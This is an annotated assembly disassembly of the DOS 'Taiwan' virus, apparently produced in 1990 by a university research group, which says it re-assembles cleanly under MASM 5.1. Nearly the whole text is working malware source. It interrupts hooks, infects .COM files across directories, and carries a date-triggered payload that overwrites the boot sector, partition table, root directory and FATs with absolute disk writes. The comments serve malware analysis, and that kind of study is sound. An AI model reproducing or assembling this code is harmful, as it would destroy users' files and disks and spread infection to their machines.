
PAGE  60,132

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ                 Progrming Research Group T.R.A.U.M.A.                    บ
; บ                   Universidade Autonoma de Lisboa                        บ       
; บ                          The 'Taiwan' Virus                              บ
; บ                Disassembled by J.L. and J.C,  Feb    1990                บ
; บ                                                                          บ
; บ                   Not  Copyrighted (c) Jean Luz.                         บ
; บ                                                                          บ
; บ      This listing is only to be made available to TRAUMA researchers     บ
; บ                                                                          บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.1
  
data_1e		equ	58h				; (0000:0058=0A9Ch)
data_2e		equ	5Ah				; (0000:005A=0D81h)
data_3e		equ	475h				; (0000:0475=2)
data_7e		equ	95h				; (76AC:0095=0A1h)
data_8e		equ	96h				; (76AC:0096=58h)
data_9e		equ	98h				; (76AC:0098=44A3h)
data_10e	equ	9Ah				; (76AC:009A=2601h)
data_11e	equ	9Eh				; (76AC:009E=0)
data_12e	equ	114h				; (76AC:0114=0BAh)
data_13e	equ	13Eh				; (76AC:013E=9Eh)
data_14e	equ	13Fh				; (76AC:013F=0)
data_15e	equ	140h				; (76AC:0140=21CDh)
data_16e	equ	142h				; (76AC:0142=0B4h)
data_17e	equ	143h				; (76AC:0143=3Dh)
data_18e	equ	144h				; (76AC:0144=2B0h)
data_19e	equ	146h				; (76AC:0146=9EBAh)
data_20e	equ	148h				; (76AC:0148=0)
data_21e	equ	14Bh				; (76AC:014B=8Bh)
data_22e	equ	17Ah				; (76AC:017A=40h)
  
code_seg_a	segment
		assume	cs:code_seg_a, ds:code_seg_a
  
  
  
tw		proc	far
		jmp	short   loc_a
		db      0B0h, 67h, 3Ch, 67h
		db	0CFh, 2Ah, 2Eh, 63h, 6Fh, 6Dh
		db	0, 2Ah, 0, 5Ch, 0, 2Eh
		db	2Eh, 0, 0, 5Ch, 0
		db	31h
		db	40 dup (0)
		db	64h, 0, 0, 0, 50h, 10h
		db	0, 0FCh, 0, 
loc_a:		jmp short loc_1
		db 	0EDh
		db	0D8h, 0CFh, 0CFh, 0DEh, 0C3h, 0C4h
		db	0CDh, 0D9h, 8Ah, 0CCh, 0D8h, 0C5h
		db	0C7h, 8Ah, 0E4h, 0CBh, 0DEh, 0C3h
		db	0C5h, 0C4h, 0CBh, 0C6h, 8Ah, 0E9h
		db	0CFh, 0C4h, 0DEh, 0D8h, 0CBh, 0C6h
		db	8Ah, 0FFh, 0C4h, 0C3h, 0DCh, 0CFh
		db	0D8h, 0D9h, 0C3h, 0DEh, 0D3h, 8Ah
		db	8Bh, 0Ah, 0Dh, 24h, 0E3h, 0D9h
		db	8Ah, 0DEh, 0C5h, 0CEh, 0CBh, 0D3h
		db	8Ah, 0D9h, 0DFh, 0C4h, 0C4h, 0D3h
		db	8Ah, 95h
		db	0Ah, 0Dh, 24h
loc_1:
		cli					; Disable interrupts
		push	es
		mov	ax,0				
		mov	es,ax				
;	
;	To begin, let's read and change some interrupts - replacing one with other
;
		mov	ax,es:data_1e			; (0000:0058=0A9Ch)
		mov	ds:data_18e,ax			; (76AC:0144=2B0h)
		mov	ax,es:data_2e			; (0000:005A=0D81h)
		mov	ds:data_19e,ax			; (76AC:0146=9EBAh)
		mov	word ptr es:data_1e,102h	; (0000:0058=0A9Ch)
		mov	es:data_2e,cs			; (0000:005A=0D81h)
		pop	es
;
; now reprogram the primary interrupt controller (the only one on the PC/XT)
		in	al,21h				; port 21h, 8259-1 int IMR
		or	al,2
		out	21h,al				; port 21h, 8259-1 int comands
		sti					; Enable interrupts
		mov	cx,80h
		mov	si,0
		mov	bx,80h
  
locloop_2:
		mov	ax,[bx+si]
		push	ax
		inc	si
		inc	si
		loop	locloop_2			; Loop if cx > 0
  
		mov	byte ptr ds:data_12e,0		; (76AC:0114=0BAh)
		mov	byte ptr ds:data_13e,0		; (76AC:013E=9Eh)
		mov	byte ptr ds:data_14e,0		; (76AC:013F=0)
		mov	byte ptr ds:data_20e,0		; (76AC:0148=0)
		mov	ah,19h
		int	21h				; DOS Services  ah=function 19h
							;  get default drive al  (0=a:)
							; then store it
		mov	ds:data_12e,al			; (76AC:0114=0BAh)
		mov	ds:data_17e,al			; (76AC:0143=3Dh)
		mov	ah,47h				
		mov	dl,0
		mov	si,116h
		int	21h				; DOS Services  ah=function 47h
							;  get full pathname for current drive
							; putting it in the buffer pointed to by SI
		push	ds
		mov	ax,0
		mov	ds,ax
		mov	al,ds:data_3e			; (0000:0475=2)
		pop	ds
		mov	ds:data_16e,al			; (76AC:0142=0B4h)
		cmp	al,0
		je	loc_3				; Jump if equal (drive c)
		mov	ah,0Eh
		mov	dl,2
		mov	ds:data_17e,dl			; (76AC:0143=3Dh)
		int	21h				; DOS Services  ah=function 0Eh
							;  set default drive C:
loc_3:
		mov	ah,3Bh				; ';'
		mov	dx,10Fh
		int	21h				; DOS Services  ah=function 3Bh
							;  set current dir, path \
loc_4:
		mov	ah,4Eh				; 'N'
		mov	cx,3
		mov	dx,107h
		int	21h				; DOS Services  ah=function 4Eh
							;  find 1st filenam match (*.com)
		jnc	loc_5				; Jump if carry=0 (if found)
		jmp	loc_8
loc_5:
		mov	ax,ds:data_8e			; (76AC:0096=58h)
		and	ax,1Fh
		cmp	al,1Fh
		jne	loc_6				; Jump if not equal
		jmp	loc_7
loc_6:
;	Now it has found a .COM file, opens it then writes itself to it
; and here it makes it's biggest mistake: it writes itself to the OS files,
; leaving them inoperational

		mov	ax,ds:data_10e			; (76AC:009A=2601h)
		mov	ds:data_15e,ax			; (76AC:0140=21CDh)
		mov	ah,43h				; 'C'
		mov	al,1
		mov	cl,ds:data_7e			; (76AC:0095=0A1h)
		and	cx,0FEh
		mov	dx,9Eh
		int	21h				; DOS Services  ah=function 43h
							;  get/set file attrb, file found
		mov	ah,3Dh				; '='
		mov	al,2
		mov	dx,9Eh
		int	21h				; DOS Services  ah=function 3Dh
							;  open file, al=mode,name@ds:dx
		mov	bx,ax
		mov	ah,3Fh				; '?'
		mov	cx,2E7h
		mov	dx,0F800h
		int	21h				; DOS Services  ah=function 3Fh
							;  read file, cx=bytes, to ds:dx
		mov	ah,42h				; 'B'
		mov	al,0
		mov	cx,0
		mov	dx,0
		int	21h				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
		mov	ah,40h				; '@'
		mov	cx,2E7h
		mov	dx,100h
		int	21h				; DOS Services  ah=function 40h
							;  write file cx=bytes, to ds:dx
		mov	ah,42h				; 'B'
		mov	al,2
		mov	cx,0
		mov	dx,0
		int	21h				; DOS Services  ah=function 42h
							;  move file ptr, cx,dx=offset
		mov	ah,40h				; '@'
		mov	cx,2E7h
		mov	dx,0F800h
		int	21h				; DOS Services  ah=function 40h
							;  write file cx=bytes, to ds:dx
		mov	ah,57h				; 'W'
		mov	al,1
		mov	cx,ds:data_8e			; (76AC:0096=58h)
		mov	dx,ds:data_9e			; (76AC:0098=44A3h)
		or	cl,1Fh
		int	21h				; DOS Services  ah=function 57h
							;  get/set file date & time
		mov	ah,43h				; 'C'
		mov	al,1
		mov	cl,ds:data_7e			; (76AC:0095=0A1h)
		mov	dx,9Eh
		int	21h				; DOS Services  ah=function 43h
							;  get/set file attrb, nam@ds:dx
		mov	ah,3Eh				; '>'
		int	21h				; DOS Services  ah=function 3Eh
							;  close file, bx=file handle
		inc	byte ptr ds:data_13e		; (76AC:013E=9Eh)
		cmp	byte ptr ds:data_13e,3		; (76AC:013E=9Eh)
		je	loc_15				; Jump if equal
loc_7:
		mov	ah,4Fh				; 'O'
		int	21h				; DOS Services  ah=function 4Fh
							;  find next filename match
		jc	loc_8				; Jump if carry Set (if no more .com files)
		jmp	loc_5				; infect next file
		
loc_8:
; Now (I'm not sure about this) I think it's looking for subdirectories, so it can spread there
; too.
		mov	ah,4Eh				; 'N'
		mov	dx,10Dh
		mov	cx,12h
		int	21h				; DOS Services  ah=function 4Eh
							;  find 1st filenam match @ds:dx
		jc	loc_13				; Jump if carry Set

loc_9:
		cmp	byte ptr ds:data_11e,2Eh	; (76AC:009E=0) '.'
		jne	loc_11				; Jump if not equal
loc_10:
		mov	ah,4Fh				; 'O'
		int	21h				; DOS Services  ah=function 4Fh
							;  find next filename match
		jnc	loc_9				; Jump if carry=0
		jmp	short loc_13
loc_11:
		mov	ah,3Bh				; ';'
		mov	dx,9Eh
		int	21h				; DOS Services  ah=function 3Bh
							;  set current dir, path @ ds:dx
		jc	loc_10				; Jump if carry Set
		mov	cx,0Bh
		mov	si,0
		mov	bx,80h
  
locloop_12:
		mov	ax,[bx+si]
		push	ax
		inc	si
		inc	si
		loop	locloop_12			; Loop if cx > 0
  
		inc	byte ptr ds:data_14e		; (76AC:013F=0)
		jmp	loc_4
; yes, it should have been directories, for now it has changed the path and has gone
; off infecting files again
loc_13:
; if it has found them all, it goes on to the next wickedness...
		cmp	byte ptr ds:data_14e,0		; (76AC:013F=0)
		je	loc_15				; Jump if equal
		dec	byte ptr ds:data_14e		; (76AC:013F=0)
		mov	ah,3Bh				; ';'
		mov	dx,111h
		int	21h				; DOS Services  ah=function 3Bh
							;  set current dir, path @ ds:dx
		mov	cx,0Bh
		mov	di,14h
		mov	bx,80h
  
locloop_14:
		pop	ax
		mov	[bx+di],ax
		dec	di
		dec	di
		loop	locloop_14			; Loop if cx > 0
  
		mov	ah,4Fh				; 'O'
		int	21h				; DOS Services  ah=function 4Fh
							;  find next filename match
		jc	loc_13				; Jump if carry Set
		jmp	short loc_9
loc_15:
; Finally, it it wasn't bugged and very amateurish 
; (making the infected files useless)
; it would check for a date and then destroy the current disk if it was that date
; ( The 8 of each month. Why???)
		mov	ah,2Ah				; '*'
		int	21h				; DOS Services  ah=function 2Ah
							;  get date, cx=year, dx=mon/day
		cmp	dl,8
		jne	loc_16				; Jump if not equal
		mov	byte ptr ds:data_20e,1		; (76AC:0148=0)
		mov	al,ds:data_17e			; (76AC:0143=3Dh)
		mov	cx,0A0h
		mov	dx,0
		mov	bx,0
		int	26h				; Absolute disk write, drive al
; Write over the boot sector (and the partition table, if it's a hard disk),
;the root directory and probably both FATs (if the DOS partition is the first
; on the HD, off course), then try doing the same to second HD) 
		popf					; Pop flags
		cmp	byte ptr ds:data_16e,2		; (76AC:0142=0B4h)
		jne	loc_17				; Jump if not equal
		mov	al,3
		mov	cx,0A0h
		mov	dx,0
		mov	bx,0
		int	26h				; Absolute disk write, drive al
		popf					; Pop flags
		jmp	short loc_17
loc_16:
		mov	ah,0Eh
		mov	dl,ds:data_12e			; (76AC:0114=0BAh)
		int	21h				; DOS Services  ah=function 0Eh
							;  set default drive dl  (0=a:)
		mov	ah,3Bh				; ';'
		mov	dx,115h
		int	21h				; DOS Services  ah=function 3Bh
							;  set current dir, path @ ds:dx
; Now change the interrupts again 
loc_17:
		cli					; Disable interrupts
		push	es
		mov	ax,0
		mov	es,ax
		mov	ax,ds:data_18e			; (76AC:0144=2B0h)
		mov	es:data_1e,ax			; (0000:0058=0A9Ch)
		mov	ax,ds:data_19e			; (76AC:0146=9EBAh)
		mov	es:data_2e,ax			; (0000:005A=0D81h)
		pop	es
		in	al,21h				; port 21h, 8259-1 int IMR
		and	al,0FDh
		out	21h,al				; port 21h, 8259-1 int comands
		sti					; Enable interrupts
		cmp	byte ptr ds:data_20e,1		; (76AC:0148=0)
		jne	loc_20				; Jump if not equal
		mov	cx,2Ch
		mov	di,0
		mov	bx,14Bh
  
locloop_18:
		xor	byte ptr [bx+di],0AAh
		inc	di
		loop	locloop_18			; Loop if cx > 0
  
		mov	cx,10h
		mov	di,0
		mov	bx,17Ah
  
locloop_19:
; Finally write something on the screen, it seems like blanks
; wait for for a keypress (doesn't matter which) then jump somewhere I can't understand.

		xor	byte ptr [bx+di],0AAh
		inc	di
		loop	locloop_19			; Loop if cx > 0
  
		mov	ah,9
		mov	dx,data_21e			; (76AC:014B=8Bh)
		int	21h				; DOS Services  ah=function 09h
							;  display char string at ds:dx
		mov	ah,9
		mov	dx,data_22e			; (76AC:017A=40h)
		int	21h				; DOS Services  ah=function 09h
							;  display char string at ds:dx
		mov	ah,7
		int	21h				; DOS Services  ah=function 07h
							;  get keybd char al, no echo
loc_20:
		mov	cx,80h
		mov	di,0FEh
		mov	bx,80h
  
locloop_21:
		pop	ax
		mov	[bx+di],ax
		dec	di
		dec	di
		loop	locloop_21			; Loop if cx > 0
  
		mov	cx,8
		mov	si,3DFh
		mov	di,0F800h
		cld					; Clear direction
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		mov	cx,2E7h
		mov	si,ds:data_15e			; (76AC:0140=21CDh)
		add	si,100h
		jmp	$+0 				;replaced a jump to an inexistant loc_22
		db	0BFh, 0, 1, 0F3h, 0A4h, 0E9h
		db	0F8h, 8, 0EBh
		db	5Dh
		db	93 dup (90h)
		db	0B8h, 0, 0, 0CDh, 21h
		db	643 dup (0)
  
tw		endp
  
code_seg_a	ends
  
  
  
		end
